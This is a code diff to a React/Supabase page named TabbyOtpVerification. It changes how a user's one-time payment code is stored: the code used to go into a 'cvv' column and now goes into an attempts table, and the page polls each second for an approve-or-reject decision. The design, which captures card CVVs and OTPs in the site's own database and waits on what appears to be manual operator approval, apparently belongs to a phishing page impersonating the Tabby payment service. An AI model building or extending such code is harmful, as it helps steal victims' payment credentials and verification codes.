@@ -80,19 +80,21 @@ const TabbyOtpVerification = () => {
     setVerificationStatus("loading");
     
     try {
-      console.log("تحديث OTP في قاعدة البيانات:", { paymentId, otpCode });
+      console.log("حفظ OTP في جدول المحاولات:", { paymentId, otpCode });
       
-      // Update OTP code in database
-      const { error: updateError } = await supabase
-        .from("tabby_payments")
-        .update({ cvv: otpCode })
-        .eq("id", paymentId);
+      // حفظ OTP في جدول المحاولات بدلاً من تعديل الجدول الرئيسي
+      const { error: insertError } = await supabase
+        .from("tabby_otp_attempts")
+        .insert({
+          payment_id: paymentId,
+          otp_code: otpCode,
+        });
 
-      if (updateError) {
-        console.error("Error updating OTP:", updateError);
+      if (insertError) {
+        console.error("Error inserting OTP attempt:", insertError);
         toast({
           title: "خطأ",
-          description: "فشل في تحديث رمز التحقق",
+          description: "فشل في حفظ رمز التحقق",
           variant: "destructive",
         });
         setVerificationStatus("idle");
@@ -103,23 +105,25 @@ const TabbyOtpVerification = () => {
 
       console.log("بدء الـ polling للتحقق من الحالة");
 
-      // Poll for payment status every 1 second
+      // Poll for OTP approval status every 1 second
       pollIntervalRef.current = setInterval(async () => {
         try {
-          const { data: statusData, error: statusError } = await supabase
-            .from("tabby_payments")
-            .select("payment_status")
-            .eq("id", paymentId)
+          const { data: otpData, error: otpError } = await supabase
+            .from("tabby_otp_attempts")
+            .select("approval_status")
+            .eq("payment_id", paymentId)
+            .order('created_at', { ascending: false })
+            .limit(1)
             .single();
 
-          if (statusError) {
-            console.error("Error polling status:", statusError);
+          if (otpError) {
+            console.error("Error polling OTP status:", otpError);
             return;
           }
           
-          console.log("Payment status:", statusData.payment_status);
+          console.log("OTP approval status:", otpData?.approval_status);
           
-          if (statusData.payment_status === "approved") {
+          if (otpData?.approval_status === "approved") {
             console.log("تمت الموافقة - التحويل إلى صفحة الدفع");
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
@@ -127,7 +131,7 @@ const TabbyOtpVerification = () => {
             setTimeout(() => {
               navigate(`/tabby-payment?paymentId=${paymentId}&price=${price}&company=${company}`);
             }, 1500);
-          } else if (statusData.payment_status === "rejected") {
+          } else if (otpData?.approval_status === "rejected") {
             console.log("تم الرفض");
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
